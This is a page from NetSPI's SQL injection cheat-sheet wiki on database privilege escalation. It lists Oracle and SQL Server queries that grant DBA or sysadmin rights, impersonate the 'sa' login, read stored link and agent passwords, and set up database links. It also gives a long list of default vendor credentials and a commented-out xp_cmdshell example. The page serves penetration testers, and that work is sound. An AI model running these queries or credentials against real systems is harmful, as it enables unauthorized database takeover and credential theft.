<html>

<head>
  <meta charset="utf-8">
  <title>Privilege Escalation | NetSPI SQL Injection Wiki</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="../../assets/scss/index.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/nav.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/tab.css%3F1571409135814090317.css" />
  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
  <script src="../../assets/javascripts/cash.min.js"></script>
  <script type="text/javascript" async src="../../assets/javascripts/index.js%3F1571409135814090317"></script>
  
  <script type="text/javascript" async src="../../assets/javascripts/tab.js%3F1571409135814090317"></script>
  
  <meta name="theme-color" content="#ffffff">
  <meta property="og:type" content="website" />
  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
  <meta property="og:description" content="Certain functionalities require a privileged user and for escalating a vulnerability a privileged user is always the first step." />
  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
  <meta name="twitter:description" content="Certain functionalities require a privileged user and for escalating a vulnerability a privileged user is always the first step." />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
  <meta name="twitter:site" content="@netspi" />
  <meta name="twitter:creator" content="@netspi" />
  <meta name="description" content="Certain functionalities require a privileged user and for escalating a vulnerability a privileged user is always the first step.">
  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,privilege escalation, dba, dbo, admin, administrator">
  <link rel="author" href="https://netspi.com" />
  <link rel="shortcut icon" href="../../assets/images/favicon.ico">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
</head>

<body class="preload">
  <div class="mobile"></div>
  <div id="contentWrapper">
    <div id="topBar">
      <div class="n-nav-icon default">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div id="logoContainer">
      <a href="https://netspi.com"><img src="../../assets/images/logo.png%3F1571409135814090317" /></a><br/>
      </div>
    </div>
    <div class="n-navbar default">
      <ul>
  
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/" href="../../index.html">
      
    <div>Home</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
    
    <div>About Us</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/detection" href="../../detection.html">
      
    <div>Injection Detection</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/dbmsIdentification/" href="../../dbmsIdentification/index.html">
      
    <div>DBMS Identification</div>
    </a>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTypes/" href="../../injectionTypes/index.html">
          
          <div>Injection Types</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/errorBased/" href="../../injectionTypes/errorBased/index.html">
          
          <div>Error Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/unionBased/" href="../../injectionTypes/unionBased/index.html">
          
          <div>Union Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/blindBased/" href="../../injectionTypes/blindBased/index.html">
          
          <div>Blind Based Injection</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTechniques/" href="../../injectionTechniques/index.html">
          
          <div>Injection Techniques</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../../injectionTechniques/conditionalStatements/index.html">
          
          <div>Conditional Statements</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../../injectionTechniques/injectionPlacement/index.html">
          
          <div>Injection Placement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/obfuscation/" href="../../injectionTechniques/obfuscation/index.html">
          
          <div>Injection Obfuscation</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/attackQueries/" href="../index.html">
          
          <div>Attack Queries</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/informationGathering/" href="../informationGathering/index.html">
          
          <div>Information Gathering</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataTargeting/" href="../dataTargeting/index.html">
          
          <div>Data Targeting</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="index.html">
          
          <div>Privilege Escalation</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/executingOSCommands/" href="../executingOSCommands/index.html">
          
          <div>Executing OS Commands</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="../readingAndWritingFiles/index.html">
          
          <div>Reading and Writing Files</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/lateralMovement/" href="../lateralMovement/index.html">
          
          <div>Lateral Movement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataExfiltration/" href="../dataExfiltration.html">
          
          <div>Data Exfiltration</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/persistence/" href="../persistence/index.html">
          
          <div>Persistence</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
          <div>Misc.</div>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/contributors" href="../../misc/contributors.html">
          
          <div>Contributors</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/references/" href="../../misc/references/index.html">
          
          <div>References</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/sandboxes/" href="../../misc/sandboxes/index.html">
          
          <div>Sandboxes</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/tools/" href="../../misc/tools/index.html">
          
          <div>Tools</div>
        </a>
      </li>
      
    </ul>
  </li>
   
</ul>

    </div>
    <div id="contentContainer">
      <div id="tabs" class="tabs" data-tabs-ignore-url="false">

<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
<div id="tabPanel" class="tabPanel">
     <p class="readableText">No data yet, please contribute on our <a href="https://github.com/NetSPI/SQLInjectionWiki" target="_blank">Github</a> if you know any useful methods!</p>


</div>

<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="privilege-escalation">Privilege Escalation</h3>

<p class="pageDescription">Certain functionalities require a privileged user and for escalating a vulnerability a privileged user is always the first step.</p>
<p>* Requires privileged user</p>

<table class="table table-striped table-hover">
    <thead>
        <tr>
            <th>Description</th>
            <th>Query</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Dump All DBA Usernames</td>
            <td>SELECT username FROM user_role_privs WHERE granted_role='DBA';</td>
        </tr>
        <tr>
            <td>Make User DBA</td>
            <td>* GRANT DBA to USER</td>
        </tr>
        <tr>
            <td>Create Procedure</td>
            <td>CREATE OR REPLACE PROCEDURE “SYSTEM".netspi1 (id IN VARCHAR2)<br>AS<br>PRAGMA autonomous_transaction;<br>EXECUTE IMMEDIATE 'grant dba to scott';<br>COMMIT;<br>END;<br><br>BEGIN<br>SYSTEM.netspi1('netspi');<br>END;</td>
        </tr>

        <tr>
          <td>Find Database Links</td>
          <td>SELECT * FROM DBA_DB_LINKS<br/>SELECT * FROM ALL_DB_LINKS<br/>SELECT * FROM USER_DB_LINKS</td>
        </tr>
        <tr>
          <td>Query Database Links</td>
          <td>SELECT * FROM sales@miami -- minimum for preconfigured<br/> SELECT * FROM harold@netspi.com -- standard usage for selecting table from schema on remote server<br/> SELECT * FROM harold@netspi.com@hq_1 -- standard usage for selecting table
            from schema on remote server instance<br/> SELECT db_link,password FROM user_db_links WHERE db_link LIKE 'TEST%''<br/> SELECT name,password FROM sys.link$ WHERE name LIKE 'TEST%';<br/> SELECT name,passwordx FROM sys.link$ WHERE name LIKE 'TEST%';</td>
        </tr>
        <tr>
          <td>Execute stored procedures on database links</td>
          <td>EXEC mySchema.myPackage.myProcedure@myRemoteDB( 'someParameter' );<br/> SELECT dbms_xmlquery.getxml('select * from emp') FROM harold@netspi.com</td>
        </tr>
        <tr>
          <td>Creating database links</td>
          <td>CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com; -- connected user setup<br/>
    CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com CONNECT TO harold AS tiger; -- standard defined user/pass<br/>
    CREATE SHARED PUBLIC DATABASE LINK hq.netspi.com.com@hq_1 USING 'string_to_hq_1'; -- instance specific<br/>
    CREATE SHARED PUBLIC DATABASE LINK link_2 CONNECT TO jane IDENTIFIED BY doe USING 'us_supply'; -- defined user/pass</td>
        </tr>
        <tr>
          <td>Removing Links</td>
          <td>DROP DATABASE LINK miami;</td>
        </tr>
    </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="privilege-escalation">Privilege Escalation</h3>


<p class="pageDescription">Certain functionalities require a privileged user and for escalating a vulnerability a privileged user is always the first step.</p>

<p>* Requires privileged user.  The queries below require various privilege types.  Stay tuned for detailed privilege escalation paths.</p>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Make User DBA</td>
      <td>* EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';</td>
    </tr>
    <tr>
      <td>Grant Execute on All Custom Objects</td>
      <td>SELECT 'grant exec on ' + QUOTENAME(ROUTINE_SCHEMA) + '.' +<br>QUOTENAME(ROUTINE_NAME) + ' TO test' FROM INFORMATION_SCHEMA.ROUTINES<br>WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),'IsMSShipped') = 0 ;</td>
    </tr>
    <tr>
      <td>Grant Execute on All Store Procedures</td>
      <td>CREATE ROLE db_executor<br>GRANT EXECUTE TO db_executor<br>exec sp_addrolemember 'db_executor', 'YourSecurityAccount'</td>
    </tr>
    <tr>
      <td>UNC Path Injection</td>
      <td><a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e" target="_blank" rel="noopener">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a><br/>
        <a href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/" target="_blank" rel="noopener">https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/</a></td>
    </tr>
    <tr>
      <td>Detect Impersonatable logins</td>
      <td>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</td>
    </tr>
    <tr>
      <td>Impersonate Login<br/><i>Note: <code>REVERT</code> will bring you back to your original login.</i></td>
      <td>EXECUTE AS LOGIN = 'sa'; SELECT @@VERSION;</td>
    </tr>
    <tr>
      <tr>
        <td>Create sysadmin user</td>
        <td>* USE [master]<br>GO<br>CREATE LOGIN [test] WITH PASSSWORD=N 'test', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF<br>GO<br>EXEC master..sp_addsrvrolemember @loginame=N'test', @rolename=N'sysadmin'<br>GO</td>
      </tr>
      <tr>
        <td>Create sysadmin user</td>
        <td>* EXEC sp_addlogin 'user', 'pass';<br>* EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';
      </tr>
      <tr>
        <td>Drop User</td>
        <td>* EXEC sp_droplogin 'user';</td>
      </tr>
      <td>Retrieve SQL Agent Connection Passwords</td>
      <td>exec msdb.dbo.sp_get_sqlagent_properties</td>
    </tr>
    <tr>
      <td>Retrieve DTS Connection Passwords</td>
      <td>select msdb.dbo.rtbldmbprops</td>
    </tr>
    <tr>
      <td>Get sysadmin as local admin</td>
      <td><a href="https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/</a></td>
    </tr>
    <tr>
      <td>Startup stored procedures</td>
      <td><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td>
    </tr>
    <tr>
      <td>Trigger creation</td>
      <td><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td>
    </tr>
    <tr>
      <td>Windows auto-logon passwords</td>
      <td><a href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</a></td>
    </tr>
    <tr>
      <td>xp_regwrite non-sysadmin execution</td>
      <td><a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e" target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td>
    </tr>
    <tr>
      <td>Stored procedures with trustworthy databases</td>
      <td><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases</a></td>
    </tr>
    <tr>
      <td>Stored procedure user impersonation</td>
      <td><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></td>
    </tr>
    <tr>
      <td>Default passwords</td>
      <td>sa:sa<br/> sa:[empty]
        <br/> [username]:[username]
      </td>
    </tr>
    <tr>
      <td>Default passwords for instances (Instance name, User, Pass)</td>
      <td>"ACS","ej","ej"<br/> "ACT7","sa","sage"
        <br/> "AOM2","admin","ca_admin"
        <br/> "ARIS","ARIS9","*ARIS!1dm9n#"
        <br/> "AutodeskVault","sa","AutodeskVault@26200" "BOSCHSQL","sa","RPSsql12345"
        <br/> "BPASERVER9","sa","AutoMateBPA9"
        <br/> "CDRDICOM","sa","CDRDicom50!"
        <br/> "CODEPAL","sa","Cod3p@l"
        <br/> "CODEPAL08","sa","Cod3p@l"
        <br/> "CounterPoint","sa","CounterPoint8"
        <br/> "CSSQL05","ELNAdmin","ELNAdmin"
        <br/> "CSSQL05","sa","CambridgeSoft_SA"
        <br/> "CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!"
        <br/> "DHLEASYSHIP","sa","DHLadmin@1"
        <br/> "DPM","admin","ca_admin"
        <br/> "DVTEL","sa",""
        <br/> "EASYSHIP","sa","DHLadmin@1"
        <br/> "ECC","sa","Webgility2011"
        <br/> "ECOPYDB","e+C0py2007_@x","e+C0py2007_@x"
        <br/> "ECOPYDB","sa","ecopy"
        <br/> "Emerson2012","sa","42Emerson42Eme"
        <br/> "HDPS","sa","sa"
        <br/> "HPDSS","sa","Hpdsdb000001"
        <br/> "HPDSS","sa","hpdss"
        <br/> "INSERTGT","msi","keyboa5"
        <br/> "INSERTGT","sa",""
        <br/> "INTRAVET","sa","Webster#1"
        <br/> "MYMOVIES","sa","t9AranuHA7"
        <br/> "PCAMERICA","sa","pcAmer1ca"
        <br/> "PCAMERICA","sa","PCAmerica"
        <br/> "PRISM","sa","SecurityMaster08"
        <br/> "RMSQLDATA","Super","Orange"
        <br/> "RTCLOCAL","sa","mypassword"
        <br/> "SALESLOGIX","sa","SLXMaster"
        <br/> "SIDEXIS_SQL","sa","2BeChanged"
        <br/> "SQL2K5","ovsd","ovsd"
        <br/> "SQLEXPRESS","admin","ca_admin"
        <br/> "STANDARDDEV2014","test","test" "TEW_SQLEXPRESS","tew","tew"
        <br/> "vocollect","vocollect","vocollect"
        <br/> "VSDOTNET","sa",""
        <br/> "VSQL","sa","111"
      </td>
    </tr>
  </tbody>
</table>







<!-- <tr>
  <td>Create Procedure</td>
  <td><em>Create Procedure</em><br>CREATE PROC mydir AS EXEC master..xp_cmdshell 'dir';<br><br><em>Run mydir Procedure</em><br>mydir;<br><br><em>Drop Procedure</em><br>DROP PROC mydir;<br></td>
</tr> -->

</div>

</div>

      <div><div>
  <br/>
  <p>© 2019 Copyright by NetSPI. All rights reserved.</p>
</div>
</div>
    </div>
  </div>
</body>
</html>
